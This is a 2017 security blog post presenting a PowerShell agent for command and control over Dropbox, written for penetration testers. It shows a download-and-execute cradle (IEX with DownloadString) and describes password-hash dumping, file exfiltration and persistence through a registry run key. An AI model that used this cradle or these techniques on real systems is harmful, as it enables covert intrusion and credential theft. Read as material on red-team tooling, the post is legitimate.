<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
<head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>dropbox c2 over powershell &middot; Truneski</title>

  
  <link rel="stylesheet" href="https://truneski.github.io/css/poole.css">
  <link rel="stylesheet" href="https://truneski.github.io/css/hyde.css">
  <link rel="stylesheet" href="https://truneski.github.io/css/poole-overrides.css">
  <link rel="stylesheet" href="https://truneski.github.io/css/hyde-overrides.css">
  <link rel="stylesheet" href="https://truneski.github.io/css/hyde-x.css">
  <link rel="stylesheet" href="https://truneski.github.io/css/override.css">
  
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
  

  
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://truneski.github.io/touch-icon-144-precomposed.png">
  <link href="https://truneski.github.io/favicon.png" rel="icon">

  
  
  
  

  <meta name="description" content="Your default page description">
  <meta name="keywords" content="your,default,page,keywords">
  
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-89933497-1', 'auto');
    ga('send', 'pageview');
  </script>
  
</head>
<body>
<div class="sidebar">
  <div class="container sidebar-sticky">
    <div class="sidebar-about">
      
      <h1>Truneski</h1>
      <p class="lead">Infosec Guy on Random CTF Walkthroughs and Research</p>
    </div>
	
    <ul class="sidebar-nav">
      <li class="sidebar-nav-item"><a href="https://truneski.github.io/post">Posts</a></li>
    </ul>

    <ul class="sidebar-nav">
      <li class="sidebar-nav-item"><a href="https://truneski.github.io/">Home</a></li>
      
      <li class="sidebar-nav-item"><a href="https://truneski.github.io/nitro/">Nitro: A quick and simple profiler for Go</a></li>
      
    </ul>

    <ul class="sidebar-nav">
      <li class="sidebar-nav-item">
      <a href="https://github.com/truneski"><i class="fa fa-github-square fa-3x"></i></a>
      
      
      <a href="https://www.linkedin.com/in/vincentobilo"><i class="fa fa-linkedin-square fa-3x"></i></a>
      
      
      <a href="https://www.twitter.com/truneski"><i class="fa fa-twitter-square fa-3x"></i></a>
      
      
      </li>
    </ul>

    

    <p>Copyright &copy; 2017 <a href="https://truneski.github.io/license/">License</a><br/>
       Powered by <a href="http://gohugo.io">Hugo</a> and <a href="https://github.com/zyro/hyde-x">Hyde-X</a></p>
  </div>
</div>


<div class="content container">
  <div class="post">
    <h1 class="post-title">dropbox c2 over powershell</h1>
    <span class="post-date">Mar 3, 2017 &middot; 4 minute read
    
    <br/>
    
    </span>
    

<p>Consider a scenario where a Pentester is trying to set up command and control on an internal network blocking all outbound traffic,
except traffic towards a few specific servers or 3rd party applications the tester has to. In this situation,
there are still a few options a tester can use. One of those is DNS command and control and the other is Command and control
over file sharing sites such as Dropbox and Google docs. In this article we will explore how dropbox can be used for
such operations and more.</p>

<p>In case you&rsquo;re unfamiliar with this concept, it involves using DropBox as a platform for command and control
since dropbox is a legitimate website for storing files and documents. This concept makes it incredibly hard for users
to immediately suspect and report malicious  activities on their systems, therefore making C2 over DropBox highly effective.</p>

<p>DropBox-C2(DBC2) by <a href="https://twitter.com/arno0x0x">@Arno0x0x</a> is the best example I&rsquo;ve come across for such a working example. It supports running commands,
shellMode for a more interactive feel, launching processes, Persistence, Data Exfiltration and running Custom Powershell modules.
The last feature I was really excited about because it gives testers many possibilities incliding running their own
custom Powershell scripts. The agent is written in C-Sharp and the server is wriiten in Python.</p>

<p>After a week and a half, I managed to implement some features of the DBC2 agent in a Powershell client available here.
I have been teaching myself Powershell over the last month and thought I&rsquo;d take on this challenge to further
my knowledge of Powershell since its quite common among real world attackers , penetration testers and APTs.
This is due to its versatility, many features and that its inbuilt in Windows systems.
In this blogpost we&rsquo;ll look at how DBC2-Powershell script can be used.</p>

<h1 id="setup">Setup</h1>

<p>You can read how to setup and use the original <a href="https://github.com/Arno0x/DBC2">DBC2</a>, its a fantastic resource
and I highly recommend it. Once you&rsquo;ve setup the server and its ready, you can start it like this:</p>

<pre><code>python dropboxc2.py
</code></pre>

<p>The server will then ask for your DropBox Access token and master password to encryp all data between agent and server controller.
A windows machine with Powershell version 5.0 is required. The DBC2 script can be loaded by downloading the script and running it as shown:</p>

<pre><code>. .\DropBox.ps1
</code></pre>

<p>Alternatively you can host it on your own server or github page and use a download cradle as shown:</p>

<pre><code>IEX (New-Object System.Net.Webclient).DownloadString('&lt;insert server name or github page/DropBox.ps1')
</code></pre>

<p>Once the script is loaded run the following command to start the DBC2 Powershell Agent:</p>

<pre><code>Invoke-Dropbox
</code></pre>

<p>Invoke-DropBox is the name of the Main function used in DBC2-Powershell. After its executed it will create two files on your
dropbox account. A status file and a command file each with a unique identifier based on each machine it&rsquo;s run own.</p>

<h1 id="executing-native-commands">Executing Native Commands</h1>

<p>From the server you can direct the client to perform and run various commands.
Here&rsquo;s a video of what that looks like:</p>

<pre><code>video1
</code></pre>

<h1 id="launching-processes">Launching Processes</h1>

<p>From the server side you can have the agent launch processes. In this case we&rsquo;ll be launching notepad and chrome.</p>

<pre><code>video2
</code></pre>

<h1 id="file-transfers">File Transfers</h1>

<p>The script can transfer files from the controller to the server and vice versa.
The short video shows how to send a file from the controller to the agent:</p>

<pre><code>video 3
</code></pre>

<h1 id="using-powershell-modules">Using Powershell Modules</h1>

<p>DBC2-Powershell Agent has the ability to run custom Powershell and return the output to the server.
It still has a few kinks which I am currently working to fix but for now can execute the scripts
and return output just fine. In the video below we will use PowerDump to dump local password hashes
from the local system. Here&rsquo;s a video of what that looks like:</p>

<pre><code>video 4
</code></pre>

<h1 id="persistence">Persistence</h1>

<p>Unlike the original DBC2 agent which relid on scheduled tasks with a a malicious bat file for persistence,
DBC2-Powershell uses a malicious registry runkey for persistence which downloads and executes our published agent
whenever a user logs on. The video below shows how the persistnce technique works:</p>

<pre><code>video 5
</code></pre>

<h1 id="future-work">Future Work</h1>

<p>There is still alot to do in this project. There are some features I&rsquo;m yrt to inplement which are working well
in the original DBC2 and they include fixing the shellmode which is functional but not yet ready to be fully demo&rsquo;d, changing the polling time, setting the sleep time, better output from the cutsom PS modules, Obfuscation and Encryption. I really struggled with the encryption part but couldn&rsquo;t make it work.
It&rsquo;s definetely on the to-do list :). I&rsquo;ll be devoting a few hours a week so that I can finally complete it. Any help is welcome.</p>

<h1 id="conclusion">Conclusion</h1>

<p>Command and control over DropBox has awesome practical advantages. If you doubt the power of such a technique you only need to read the
awesome report by Cyber-X code named <a href="https://cyberx-labs.com/en/blog/operation-bugdrop-cyberx-discovers-large-scale-cyber-reconnaissance-operation/">Operation BugDrop</a>
That report only fueled me more to release an early version even if incomplete.
Pentesters can now use DBC2-Powershell alongside the usual familiar and common powershell tools.</p>

  </div>
  
</div>





</body>
</html>

